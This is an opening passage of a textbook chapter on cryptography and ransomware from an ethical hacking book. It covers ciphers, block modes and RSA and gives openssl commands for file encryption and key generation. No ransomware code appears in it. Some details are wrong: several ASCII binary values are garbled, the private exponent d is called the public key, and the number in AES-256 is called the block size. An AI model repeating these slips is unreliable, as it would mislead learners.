<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
	<head>
		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
	</head>
	<body>
		<h2 class="h2" id="ch5"><span epub:type="pagebreak" id="page_67"/><strong><span class="big">5</span><br/>CRYPTOGRAPHY AND RANSOMWARE</strong></h2>
		<p class="verse"><em>Unless you know the code, it has no meaning.</em></p>
		<p class="chap-au">–John Connolly, <em>The Book of Lost Things</em></p>
		<div class="imagec">
			<img alt="image" src="../images/common.jpg"/>
		</div>
		<p class="noindents"><em>Ransomware</em> is malicious code that holds a machine hostage by encrypting its files. After encrypting the files, ransomware usually displays a window demanding money in exchange for the decrypted files. This chapter will show you how hackers write encryption ransomware to extort money from a company. However, before we do that, you must understand encryption algorithms and secure communications more generally. After reading this chapter, you should be able to encrypt a file with a block cipher, send an encrypted email using public-key cryptography, and design your own encryption ransomware.</p>
		<h3 class="h3" id="ch05lev1"><span epub:type="pagebreak" id="page_68"/><strong>Encryption</strong></h3>
		<p class="noindent">Imagine that Alice wants to prevent people from reading her diary, so she locks it in a safe and keeps the key. In computer systems, the analogous activity to placing a diary in a safe is to <em>encrypt</em> it by scrambling the data in some systematic way. If Alice encrypted her diary, anyone who stole it would have trouble recovering the information inside. Cryptographers refer to the original diary as <em>plaintext</em>, because everyone can plainly see what’s inside, and they refer to the encrypted diary as <em>cipher text</em>.</p>
		<p class="indent">The <em>Caesar cipher</em> was one of the earliest encryption algorithms. It encrypts messages by replacing one letter with another. For example, the letter <em>a</em> might be replaced with <em>b</em> and the letter <em>c</em> would be replaced with the letter <em>d</em>, and so on. <a href="ch05.xhtml#ch5fig1">Figure 5-1</a> shows an example of one possible mapping.</p>
		<div class="image" id="ch5fig1">
			<img alt="image" src="../images/ch05fig01.jpg"/>
		</div>
		<p class="figcap"><em>Figure 5-1: Caesar cipher encryption mapping</em></p>
		<p class="indent">Try using the mapping shown in <a href="ch05.xhtml#ch5fig1">Figure 5-1</a> to decrypt the cipher text “dbu buubdl.” You should easily retrieve the message “cat attack.” However, the original plaintext message wouldn’t be obvious to someone who read the cipher text “dbu buubdl” unless they also knew the mapping. We refer to this mapping as the <em>key</em>. In our example, the key is 1, as we’ve shifted letters by one spot in the alphabet.</p>
		<p class="indent">Notice a weakness in the Caesar cipher: if messages can contain only 26 unique letters, there are only 26 possible keys. A hacker could merely try each key until they found one that unlocked the message. The number of possible keys is called the <em>key space</em>. Encryption algorithms with larger key spaces are more secure because hackers must test more keys. The Caesar cipher isn’t secure because its key space is too small.</p>
		<p class="indent">The most secure encryption algorithms make any possible mapping equally likely, creating the largest possible key space. An algorithm known as the <em>one-time pad</em> achieves this.</p>
		<h4 class="h4" id="ch05lev2"><strong><em>One-Time Pad</em></strong></h4>
		<p class="noindent">The one-time pad algorithm encrypts a message by computing the <em>exclusive OR (XOR)</em> between the message and key. The XOR is a logic operation that outputs 1 when the two input bits differ and 0 when they are the same. For example, 1 XOR 0 = 1, whereas 1 XOR 1 = 0. <a href="ch05.xhtml#ch5fig2">Figure 5-2</a> shows an example of encrypting the word <em>SECRET</em> with the key <code>po7suq</code>.</p>
		<div class="image" id="ch5fig2">
			<span epub:type="pagebreak" id="page_69"/>
			<img alt="image" src="../images/ch05fig02.jpg"/>
		</div>
		<p class="figcap"><em>Figure 5-2: The process of using a key to encrypt a message</em></p>
		<p class="indent">First, each letter in the plaintext and key is converted to its binary representation using the ASCII mapping. The <em>American Standard Code for Information Interchange (ASCII)</em> is a standard that assigns natural language characters to binary codes. For example, the characters in the key <code>po7suq</code> map as follows: p = 0111000, o = 01101111, 7 = 00110111, s = 0110011, u = 001110101, and q = 00111001. Next, the two binary values are XOR-ed and converted back into ASCII, resulting in the string <code>#*T!0%</code>.</p>
		<p class="indent">To understand this better, let’s consider the process of encrypting <em>S</em> with the key <em>p</em>. We convert the character <em>S</em> and <em>p</em> to their respective binary representations, 01010011 and 01110000, and then compute the XOR for each pair of bits in <em>S</em> and <em>p</em> from left to right. This means that we XOR 0 with 0, 1 XOR 1, and so on, until we reach the final pair 1 XOR 0. The resulting value is 00100011, which when converted back to ASCII yields the cipher text #.</p>
		<p class="indent">Unless an attacker knows the key, it will be impossible for them to recover the original message. This is because the one-time pad algorithm ensures that any possible mapping is equally likely. Each 0 or 1 in the cipher text is equally likely to have been 0 or 1 in the plaintext, assuming you’ve randomly chosen the values in your key. A cipher value 00 is equally likely to map to a plaintext value of 11, 10, 01, or 00. This means that an <em>n</em>-bit plaintext has 2<em><sup>n</sup></em> possible cipher values. Thus, our 48-bit plaintext <code>SECRET</code> has 281 trillion possible mappings. Now <em>that</em> is a large key space.</p>
		<p class="indent">The one-time pad does leak some information. In this case, we know that the cipher text, key, and original message are all six characters long. However, this doesn’t tell us much given that the ciphertext is just as likely to correspond to the word <em>SECRET</em> as to any other six-character word, such as <em>puzzle</em>, <em>quacks</em>, or <em>hazmat</em>. This is because we could choose a six-character key that would map any of these words to the ciphertext. To decrypt the message, you’d need to XOR the cipher text with the key once again.</p>
		<div class="sidebar">
			<p class="boxtitle-d"><span epub:type="pagebreak" id="page_70"/><strong>THE MATH BEHIND THE ONE-TIME PAD</strong></p>
			<p class="noindent">To better understand how the one-time pad algorithm works, and how the same operation can both encrypt and decrypt data, consider the algebra behind it. Let’s begin by introducing some notation. Let <em>E</em>(<em>k</em>, <em>m</em>) represent the function that encrypts a message <em>m</em> by XOR-ing it with a key <em>k</em>. We’ll use the symbol <em><span class="ent">⊕</span></em> to represent the XOR operation and let <em>c</em> represent the cipher text. The following equation expresses these ideas mathematically:</p>
			<p class="center"><em>E</em>(<em>k</em>, <em>m</em>) = <em>m</em> <span class="ent">⊕</span> <em>k</em> = <em>c</em></p>
			<p class="noindent"><em>D</em>(<em>c</em>, <em>k</em>) is the function that decrypts cipher text <em>c</em> by XOR-ing it with the same key, <em>k</em>. If you look at the encryption equation, you’ll see that we can substitute (<em>m</em> <span class="ent">⊕</span> <em>k</em>) for the cipher text <em>c</em>, which will result in the following:</p>
			<p class="center"><em>D</em>(<em>k</em>, <em>c</em>) = <em>c</em> <span class="ent">⊕</span> <em>k</em> = (<em>m</em> <span class="ent">⊕</span> <em>k</em>) <span class="ent">⊕</span> <em>k</em></p>
			<p class="noindent">The XOR operator is associative, which means that the order of operations doesn’t matter. So we can rearrange the parentheses and rewrite the right-hand side of the equation as follows:</p>
			<p class="center">(<em>m</em> <span class="ent">⊕</span> <em>k</em>) <span class="ent">⊕</span> <em>k</em> = <em>m</em> <span class="ent">⊕</span> (<em>k</em> <span class="ent">⊕</span> <em>k</em>)</p>
			<p class="noindent">The XOR operator is also self-inversive, meaning that if we XOR a number with itself, the result will be 0. This gives us the following:</p>
			<p class="center"><em>m</em> <span class="ent">⊕</span> (<em>k</em> <span class="ent">⊕</span> <em>k</em>) = <em>m</em> <span class="ent">⊕</span> (0)</p>
			<p class="noindent">The XOR operator also follows the identity element property, which means that XOR-ing a number with 0 simply returns the number.</p>
			<p class="center"><em>m</em> <span class="ent">⊕</span> (0) = <em>m</em></p>
			<p class="noindent">Through the preceding steps, I have shown that decrypting the cipher text by XOR-ing it with the key will give us the original message:</p>
			<p class="center"><em>D</em>(<em>k</em>, <em>c</em>) = <em>c</em> <span class="ent">⊕</span> <em>k</em> = (<em>m</em> <span class="ent">⊕</span> <em>k</em>) <span class="ent">⊕</span> <em>k</em> = <em>m</em></p>
		</div>
		<p class="indent">The one-time pad algorithm has two limitations. First, you can use each key only once. If the same key is used more than once, a hacker can discover information about the message by XOR-ing the two cipher texts. For instance, in <a href="ch05.xhtml#ch5fig3">Figure 5-3</a>, you can see that XOR-ing the bee and stop ciphers with each other is equivalent to XOR-ing the two plaintext messages.</p>
		<div class="image" id="ch5fig3">
			<span epub:type="pagebreak" id="page_71"/>
			<img alt="image" src="../images/ch05fig03.jpg"/>
		</div>
		<p class="figcap"><em>Figure 5-3: How a hacker can recover information from two messages encrypted with same key</em></p>
		<p class="indent">The following equation outlines, in algebraic terms, how XOR-ing two ciphers (<em>c</em><sub>1</sub> and <em>c</em><sub>2</sub>) encrypted with same key <em>k</em> is equivalent to XOR-ing the two plaintext messages <em>m</em><sub>1</sub> and <em>m</em><sub>2</sub>. The self-inversive property (described in the box) causes the keys in both ciphers to cancel each other:</p>
		<p class="center"><em>c</em><sub>1</sub> <span class="ent">⊕</span> <em>c</em><sub>2</sub> <em><span class="ent">⇒</span></em> (<em>m</em><sub>1</sub> <span class="ent">⊕</span> <em>k</em>) <span class="ent">⊕</span> (<em>m</em><sub>2</sub> <span class="ent">⊕</span> <em>k</em>) <em><span class="ent">⇒</span></em> (<em>m</em><sub>1</sub> <span class="ent">⊕</span> <em>m</em><sub>2</sub>) <span class="ent">⊕</span> (<em>k</em> <span class="ent">⊕</span> <em>k</em>) <em><span class="ent">⇒</span></em> (<em>m</em><sub>1</sub> <span class="ent">⊕</span> <em>m</em><sub>2</sub>)</p>
		<p class="indent">In other words, the random information that the key provides disappears when we XOR the two cipher texts. Also, encrypting the same message with the same key will always result in the same cipher text. This allows a hacker to detect that the same message was sent twice.</p>
		<p class="indent">The key must also be the same length as the message; thus, long messages need long keys. This means that to encrypt a 250-word document, assuming an average word length of five characters, you’d need to remember a key that is 1,250 characters long.</p>
		<p class="indent">What if you could convert shorter keys, like <code>tfkd</code>, into longer keys, like <code>qwedfagberw</code>? You could then use shorter keys to encrypt long messages. As it so happens, we can achieve this by using a pseudorandom generator.</p>
		<h4 class="h4" id="ch05lev3"><strong><em>Pseudorandom Generators</em></strong></h4>
		<p class="noindent">A <em>pseudorandom generator (PRG)</em> is an algorithm that always generates the same random-looking output given the same key. This allows you to use a shorter password to create a key that is the same length as the message without having to remember the whole key. Discussions of randomness are always tricky. The results of PRGs look <em>statistically</em> random, even though they’re not sampled from a random source like atmospheric noise or radioactive decay. However, they cannot be truly statistically random because the PRG’s input is much shorter than its output. Nonetheless, no efficient algorithm will be able to tell the difference, so PRG output is as good as a statistically uniform string.</p>
		<p class="indent">How is it possible to repeatedly generate the same pseudorandom sequence of numbers from a short key? One way is to use a <em>linear congruential</em> <span epub:type="pagebreak" id="page_72"/><em>generator (LCG)</em>. The details of this formula aren’t important, but the following equation describes it if you’re curious. Here, <em>X<sub>n</sub></em> represents the <em>n</em>th number in the sequence:</p>
		<p class="center"><em>X<sub>n</sub></em><sub>+1</sub> = (<em>aX<sub>n</sub></em> + <em>c</em>) mod <em>m</em></p>
		<p class="indent">Depending on the sequence’s length, you can select different values for <em>a</em>, <em>c</em>, and <em>m</em>. You can also choose the first number in the sequence, <em>X</em><sub>0</sub>, which is called the <em>seed</em>. Consider a case with parameters <em>m</em> = 9, <em>a</em> = 2, and <em>c</em> = 0, and a seed of 1 (that is, <em>X</em><sub>0</sub> = 1). These parameters produce the following output: 2, 4, 8, 7, 5, 1. <a href="ch05.xhtml#ch5tab1">Table 5-1</a> shows how each number in the sequence is calculated.</p>
		<p class="tabcap" id="ch5tab1"><strong>Table 5-1:</strong> How the LCG Computes the Numbers in the Pseudorandom Sequence</p>
		<table class="bordertb">
			<colgroup>
				<col style="width:25%"/>
				<col style="width:50%"/>
				<col style="width:25%"/>
			</colgroup>
			<thead>
				<tr>
					<th class="borderb" style="vertical-align: top;">
						<p class="tab"><em><strong>X</strong><strong><sub>n+1</sub></strong></em></p>
					</th>
					<th class="borderb" style="vertical-align: top;">
						<p class="tab">(<em><strong>aX</strong><strong><sub>n</sub></strong> <strong>+ c)</strong></em> mod <em><strong>m</strong></em></p>
					</th>
					<th class="borderb" style="vertical-align: top;">
						<p class="tab"><em><strong>X</strong><strong><sub>n</sub></strong></em></p>
					</th>
				</tr>
			</thead>
			<tbody>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">2</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">2 <em>*</em> 1 + 0 mod 9</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">4</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">2 <em>*</em> 2 + 0 mod 9</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">2</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">8</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">2 <em>*</em> 4 + 0 mod 9</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">4</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">7</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">2 <em>*</em> 8 + 0 mod 9</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">8</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">5</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">2 <em>*</em> 7 + 0 mod 9</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">7</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">2 <em>*</em> 5 + 0 mod 9</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">5</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">2</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">2 <em>*</em> 1 + 0 mod 9</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
				</tr>
			</tbody>
		</table>
		<p class="indent">The sequence isn’t infinite, because it repeats. You can generate longer sequences by carefully choosing the parameters; however, all sequences eventually cycle back to the beginning. This process of generating longer keys from short ones is called <em>key derivation</em>.</p>
		<p class="indent">The length of sequence before the cycle repeats is called its <em>period</em>. Repetition is not the only issue with LCGs. For instance, an LCG with an extremely large period is still insecure. Another issue is that the values are predictable (even without computing a full period). You should never use LCG algorithms in cryptographic applications. We recommend that you use the <em>Password-Based Key Derivation Function 2 (PBKDF2)</em> whenever you need to derive keys.</p>
		<h4 class="h4" id="ch05lev4"><strong><em>Insecure Block Ciphers Modes</em></strong></h4>
		<p class="noindent">What if, instead of generating keys the same length as our message, we split the message into blocks? Then we could encrypt each block of the large file independently with a shorter key. This is the central idea behind <em>block cipher modes</em>. The <em>electronic code book (ECB)</em> cipher mode was one of the earliest, and although it isn’t secure, ECB illustrates the concept well.</p>
		<p class="indent"><a href="ch05.xhtml#ch5fig4">Figure 5-4</a> shows how ECB encrypts the binary sequence <code>00011011</code>. Notice how the binary sequence is split into four blocks, each of which is encrypted in parallel.</p>
		<div class="image" id="ch5fig4">
			<span epub:type="pagebreak" id="page_73"/>
			<img alt="image" src="../images/ch05fig04.jpg"/>
		</div>
		<p class="figcap"><em>Figure 5-4: An ECB block cipher mode encrypting the binary sequence</em> <code><em>00011011</em></code></p>
		<p class="indent">In this example, the block implements a simple function that XORs the input with the key 01. However, given the same key and input, ECB will always output the same cipher text, leaking information to the hacker. ECB also reuses the key for each block, which reduces the number of possible outcomes and makes it easier for a hacker to decrypt the message. For example, <a href="ch05.xhtml#ch5fig5">Figure 5-5</a> shows an image that has been encrypted with ECB.</p>
		<div class="image" id="ch5fig5">
			<img alt="image" src="../images/ch05fig05.jpg"/>
		</div>
		<p class="figcap"><em>Figure 5-5: The image on the left is the original image, whereas the image on right is an encrypted image.</em></p>
		<p class="indent">Notice that you can still see the outline of the atom in the encrypted file. This is due to information leakage from using the same key for each block. A similar amount of information would be leaked if the ECB cipher were used to encrypt text.</p>
		<p class="indent">The subtle flaws of the Caesar cipher, one-time pad, and ECB should illustrate why you should never implement an encryption algorithm yourself. Encryption is very delicate, and small deviations from the specification could result in an insecure implementation. Always use secure algorithms from trusted libraries.</p>
		<h4 class="h4" id="ch05lev5"><span epub:type="pagebreak" id="page_74"/><strong><em>Secure Block Ciphers Modes</em></strong></h4>
		<p class="noindent">Let’s take a look at a better encryption algorithm. <a href="ch05.xhtml#ch5fig6">Figure 5-6</a> shows the design of the <em>counter mode block cipher (CTR)</em>.</p>
		<div class="image" id="ch5fig6">
			<img alt="image" src="../images/ch05fig06.jpg"/>
		</div>
		<p class="figcap"><em>Figure 5-6: The design of the CTR</em></p>
		<p class="indent">CTR overcomes two limitations of ECB. First, CTR generates a random number, called a <em>nonce</em> (a number used once), which it uses to create a unique pad every time the file is encrypted. It then attaches the nonce to a counter that uniquely identifies each block before sending it to the block. This ensures that each block receives unique information.</p>
		<p class="indent">Let’s consider an example. We’ll use a 1-bit counter and 1-bit nonce value of 0. The counter will cycle between 0 and 1. When attached to the end of the nonce, this would result in the following inputs: 00 and 01. The combination of nonce and counter is then fed to each block, which returns a block-specific pad. To encrypt the block, we XOR this block-specific pad with the plaintext in that block to create the final cipher text. <a href="ch05.xhtml#ch5fig7">Figure 5-7</a> shows an example of encrypting the binary sequence 0000 using a CTR with a 1-bit counter{0,1} and a 1-bit nonce (coin flip heads:1, tails:0).</p>
		<div class="image" id="ch5fig7">
			<img alt="image" src="../images/ch05fig07.jpg"/>
		</div>
		<p class="figcap"><em>Figure 5-7: Encrypting the binary sequence</em> <code><em>0000</em></code> <em>using a CTR with a 1-bit counter and a 1-bit nonce</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_75"/>The blocks in this example use the same key and mapping shown in <a href="ch05.xhtml#ch5fig6">Figure 5-6</a>.</p>
		<p class="indent">It’s important to distinguish between block ciphers and a block cipher mode of operation. A block cipher is a keyed function that takes a block of <em>n</em> bits and outputs a block of <em>n</em> bits. The output of a secure block cipher looks like a random permutation of the input block. Though we have been using the XOR function in our examples, the NSA recommends using the <em>Advanced Encryption Standard (AES)</em> cipher.</p>
		<p class="indent">Block ciphers themselves are not an encryption scheme; however, you can use them in various “modes” to obtain an encryption scheme. ECB and CTR are examples of modes of operation. When we say that ECB is insecure, it’s the mode that is broken and not the underlying block cipher.</p>
		<h3 class="h3" id="ch05lev6"><strong>Encrypting and Decrypting a File</strong></h3>
		<p class="noindent">Let’s use the CTR cipher to encrypt a file. Begin by opening a terminal on the Kali Linux virtual machine. Create a text file containing the message “Top Secret Code” by running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">echo "Top Secret Code" &gt; plain.txt</span></pre>
		<p class="indent">To view the content of the file, run the <code>cat</code> command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">cat plain.txt</span></pre>
		<p class="indent">We’ll use the <code>openssl</code> library, which includes several encryption algorithms and is preinstalled on Kali Linux. Encrypt the file by running the following command and entering a password when prompted:</p>
		<pre>kali@kali:~$ <span class="codestrong1">openssl enc -aes-256-ctr -pbkdf2 -e -a -in plain.txt -out encrypted.txt</span></pre>
		<p class="indent">The <code>enc -aes-256-ctr</code> flag specifies that you want to use the <em>aes-256-ctr</em> block cipher. The block cipher’s name is divided into three parts. The first section (<code>aes</code>) represents the mapping function used in each block, in this case the AES cipher mentioned earlier. The next section (<code>256</code>) represents the block size, which is 256 bits in this case. The last section (<code>ctr</code>) represents a CTR block cipher mode. The next option, <code>-pbkdf2</code>, represents the key derivation function, and the <code>-e</code> flag tells <code>openssl</code> to encrypt the file. The <code>-a</code> flag outputs an encrypted file in Base64 encoding instead of binary, which will make it easier for us to print the encrypted file in the terminal. Lastly, we use the options <code>-in</code> and <code>-out</code> to specify the file that we want to encrypt and the name of the output file, respectively.</p>
		<p class="indent">To view the contents of your encrypted file, use the <code>cat</code> command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">cat encrypted.txt</span></pre>
		<p class="indent">To decrypt the file, run the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">openssl enc -aes-256-ctr -pbkdf2 -d -a -in encrypted.txt -out decrypted.txt</span></pre>
		<p class="indent"><span epub:type="pagebreak" id="page_76"/>The <code>-d</code> flag instructs <code>openssl</code> to decrypt the file. Enter the password you used earlier. Like the one-time pad algorithm, the CTR decrypts cipher text by XORing it with the key output by the block, thereby reversing the encryption process.</p>
		<p class="indent">Note that a hacker who steals this encrypted file might not be able to decrypt it, but they can still corrupt it by changing the encrypted bits. In <a href="ch06.xhtml#ch6">Chapter 6</a>, we’ll discuss an encryption algorithm that allows you to share encrypted files and detect a corrupted copy.</p>
		<h3 class="h3" id="ch05lev7"><strong>Email Encryption</strong></h3>
		<p class="noindent">Now that you’ve encrypted and decrypted a file, let’s tackle the challenge of sending an encrypted email over a public network, where you should assume that anyone can read any unencrypted messages you send. At first glance, correcting this problem doesn’t seem too difficult. You can create a key and send an encrypted message over the public network so those who intercept the message won’t be able to read it.</p>
		<p class="indent">However, your recipient won’t be able to read the message either because they don’t have the key. Assuming that you’ll never meet in person to exchange keys, how can you get the key to your recipient without it being intercepted? You can use a technique called <em>publickey cryptography</em>, also known as <em>asymmetric cryptography</em>.</p>
		<h4 class="h4" id="ch05lev8"><strong><em>Public-Key Cryptography</em></strong></h4>
		<p class="noindent">Instead of a single shared key, public-key cryptography uses two keys: a public key, which everyone can see, and a private key, which is never shared. These two keys are mathematically linked, so messages encrypted with the public key can be decrypted only by using the private key, and vice versa.</p>
		<p class="indent">To see how public-key cryptography is useful for sending messages, let’s consider an analogy. What if you wanted to send Alice your diary through the mail, but you didn’t want anyone in the mail system to be able to read it? You could lock your diary in a box and send it to Alice, but Alice can’t open the box because she doesn’t have the key. Instead, what if Alice first sends you an open lock and keeps the key? The lock doesn’t protect any secret information, so it’s fine if everyone in the public mail system can see it.</p>
		<p class="indent">You can think of this lock as Alice’s public key. Now you can lock the diary in a box using the lock Alice sent you and send it through the mail to Alice. No one in the mail system would be able to open your box (not even you!) because only Alice has the key. When Alice receives the box, she unlocks it using her private key.</p>
		<p class="indent">Actual public keys are a bit different than locks because they can both encrypt (like a lock) and decrypt (like a key). The same is true of private keys. If a message is encrypted using a public key, only the individual with the private key can decrypt it. But if a message is encrypted using the private key, anyone with the public key can decrypt it.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_77"/>It might not be obvious at first why anyone would ever encrypt something with their private key since anyone with access to your public key could decrypt the message. But encrypting messages with your private key guarantees to others that the message came from you because you’re the only person with access to your private key. The process of encrypting messages with your private key is often referred to as <em>signing</em>. By signing a message, you guarantee that it came from you. For example, when you request a web page from your bank, the bank’s server will provide a signed certificate, proving its authenticity. We will discuss this topic in more detail in <a href="ch06.xhtml#ch6">Chapter 6</a>.</p>
		<p class="indent">Let’s take a look at one of the algorithms that makes public-key cryptography possible: Rivest–Shamir–Adleman.</p>
		<h4 class="h4" id="ch05lev9"><strong><em>Rivest–Shamir–Adleman Theory</em></strong></h4>
		<p class="noindent">Instead of randomly generating a key, public-key cryptography creates the relationship between the two keys by computing them. Let’s develop some mathematical notation to help us discuss the <em>Rivest–Shamir–Adleman (RSA)</em> algorithm. We’ll denote the integer representing the public key as <em>e</em>, for encryption, and the integer representing the private key as <em>d</em> for decryption. (These were the variables used in the paper that first introduced RSA.) Before we discuss how these keys are generated, we’ll cover the encryption and decryption process.</p>
		<p class="indent">We can represent a message <em>m</em> in binary, and these binary values can be interpreted as decimal numbers. For example, the ASCII character <em>A</em> corresponds to the binary value 1000001, which can be interpreted as the integer 65. We can now encrypt the value 65 by defining a function that maps 65 to a new cipher value <em>c</em>. The following equation defines the encryption function:</p>
		<p class="center"><em>E</em>(<em>e</em>, <em>m</em>, <em>n</em>) = <em>m<sup>e</sup></em> mod <em>n</em> <span class="ent">≡</span> <em>c</em></p>
		<p class="indent">This encryption equation introduces a new public parameter, <em>n</em>. This parameter is created during the key generation process and we’ll discuss it later.</p>
		<p class="indent">You might also be wondering why a hacker can’t decrypt a message by computing <span class="middle"><img alt="image" src="../images/077equ01.jpg"/></span>. This is difficult to compute for large values of <em>m</em> and <em>e</em>, and is further complicated by the fact that you must account for the mod <em>n</em> operation. So how can Alice decrypt the message? The public key (<em>e</em>) and the private key (<em>d</em>) are designed so that if you raise the cipher text to the value of private key <em>d</em> and compute the modulus, you will get the original message back. (We commonly referred to features like these as <em>trapdoors</em>.)</p>
		<h4 class="h4" id="ch05lev10"><strong><em>The RSA Math</em></strong></h4>
		<p class="noindent">Let’s explain how this all works. Let’s begin by expressing the decryption process mathematically:</p>
		<p class="center"><em>D</em>(<em>d</em>, <em>c</em>, <em>n</em>) = <em>c<sup>d</sup></em> mod <em>n</em> <span class="ent">≡</span> <em>m</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_78"/>If we substitute the expression for <em>c</em> from the encryption equation into the decryption equation, we can rewrite the decryption equation so that it contains the public and private keys (<em>e</em>, <em>d</em>) and the generated parameter (<em>n</em>):</p>
		<p class="center">(<em>m<sup>e</sup></em> mod <em>n</em>)<em><sup>d</sup></em> mod <em>n</em> <span class="ent">≡</span> <em>m</em></p>
		<p class="indent">We can then simplify the equation using the following mathematical property:</p>
		<p class="center">(<em>a</em> mod <em>n</em>)<em><sup>d</sup></em> mod <em>n</em> <span class="ent">≡</span> <em>a<sup>d</sup></em> mod <em>n</em></p>
		<p class="indent">Which allows us to rewrite it as:</p>
		<p class="center"><em>m<sup>ed</sup></em> mod <em>n</em> <span class="ent">≡</span> <em>m</em></p>
		<p class="indent">Now, if only we could choose <em>e</em>, <em>d</em> values so that coefficient of <em>m</em> would be 1. We could then show that <em>m<sup>ed</sup></em> mod <em>n</em> = <em>m</em> for all values of <em>m</em> smaller than <em>n</em>, as shown in the following equation:</p>
		<p class="center"><em>m<sup>ed</sup></em> mod <em>n</em> <span class="ent">≡</span> <em>m</em><sup>1</sup> mod <em>n</em> <span class="ent">≡</span> <em>m</em></p>
		<p class="indent">We could make this true if we set both integers <em>e</em> and <em>d</em> to 1. But how could we rewrite the equation so that it’s true for other values? Consider the following property, which is true for any <em>x</em> and <em>y</em> value where <em>n</em> is the product of two primes: <em>p</em>, <em>q</em> and <em>z</em> = (<em>p</em> – 1)(<em>q</em> – 1):</p>
		<p class="center"><em>x<sup>y</sup></em> mod <em>n</em> <span class="ent">≡</span> <em>x</em><sup>(<em>y</em> mod <em>z</em>)</sup> mod <em>n</em></p>
		<p class="indent">If we rewrite the previous equation using this property, we get the following:</p>
		<p class="center"><em>m</em><sup>(<em>ed</em> mod <em>z</em>)</sup> mod <em>n</em> <span class="ent">≡</span> <em>m</em></p>
		<p class="indent">Now we can use integer values other than 1 for <em>e</em> and <em>d</em>, as long as we ensure that <em>ed</em> mod <em>z</em> = 1.</p>
		<p class="indent">But how do we programmatically discover the integer values for <em>e</em> and <em>d</em>? The key generator algorithm allows us to generate appropriate integer values for <em>e</em>, <em>d</em>, and <em>n</em>. The key generation algorithm consists of four key steps:</p>
		<p class="numbera">1. Select two large prime numbers (<em>p</em>, <em>q</em>) and keep them secret.</p>
		<p class="number">2. Compute <em>n</em> = <em>pq</em> and <em>z</em> = (<em>p</em> – 1)(<em>q</em> – 1).</p>
		<p class="number">3. Compute the public key (<em>e</em>) by choosing an integer that is less than <em>n</em> and relatively prime to <em>z</em>, meaning that it has no factors in common with z. Algorithms often choose the value 65,537.</p>
		<p class="number">4. Use the <em>extended Euclidean</em> algorithm to compute the public key (<em>d</em>) by choosing an integer <em>d</em> such that <em>ed</em> mod <em>z</em> = 1.</p>
		<p class="indenta">Now you have the values for <em>e</em>, <em>d</em>, and <em>n</em>.</p>
		<p class="indent">So far we’ve focused solely on the RSA algorithm. But secure implementations of RSA must also use the <em>optimal asymmetric encryption padding (OAEP)</em> algorithm. For simplicity, I’ve delayed discussing the OAEP algorithm and will cover it later in the chapter. But don’t worry, we’ll include the <code>-oaep</code> flag when encrypting and decrypting files using <code>openssl</code>, so the commands shown here should be secure.</p>
		<h3 class="h3" id="ch05lev11"><span epub:type="pagebreak" id="page_79"/><strong>Encrypting a File with RSA</strong></h3>
		<p class="noindent">Now that you know the theory behind RSA, let’s use the <code>openssl</code> library to generate an encrypted email. To begin, generate a pair of public and private keys by running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">openssl genrsa -out pub_priv_pair.key 1024</span></pre>
		<p class="indent">The <code>genrsa</code> flag lets <code>openssl</code> know that you want to generate an RSA key, the <code>-out</code> flag specifies the name of the output file, and the value <code>1024</code> represents the length of the key. Longer keys are more secure. The NSA recommends RSA key lengths of 3,072 bits or longer. Remember: don’t share your private key with anyone. You can view the key pair you generated by running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">openssl rsa -text -in pub_priv_pair.key</span></pre>
		<p class="indent">The <code>rsa</code> flag tells <code>openssl</code> to interpret the key as an RSA key and the <code>-text</code> flag displays the key in human-readable format. You should see output like the following:</p>
		<pre> RSA Private-Key: (1024 bit, 2 primes)<br/>modulus:<br/>
    00:b9:8c:68:20:54:be:cd:cc:2f:d9:31:f0:e1:6e:<br/>
    7e:bc:c9:43:1f:30:f7:33:33:f6:74:b9:6f:d1:d9:<br/>
    .....<br/>publicExponent: 65537 (0x10001)<br/>privateExponent:<br/>
    73:94:01:5c:7a:4d:6c:36:0f:6c:14:8e:be:6d:ac:<br/>
    a6:7e:1b:c0:77:28:d4:8d:3e:ac:d0:c1:d5:8e:d0:<br/>
    .....<br/>prime1:<br/>
    00:dc:15:15:14:47:31:75:5d:37:33:57:e0:86:f7:<br/>
    7d:2e:70:79:05:e1:e0:50:2f:20:46:60:e0:47:bf:<br/>
    .....<br/>prime2:<br/>
    00:d7:d4:84:90:34:d9:2f:b2:52:54:a0:a9:28:fd:<br/>
    2a:95:fd:67:b7:81:05:69:82:12:96:63:2c:14:26:<br/>
    .....<br/>
................<br/>writing RSA key<br/>
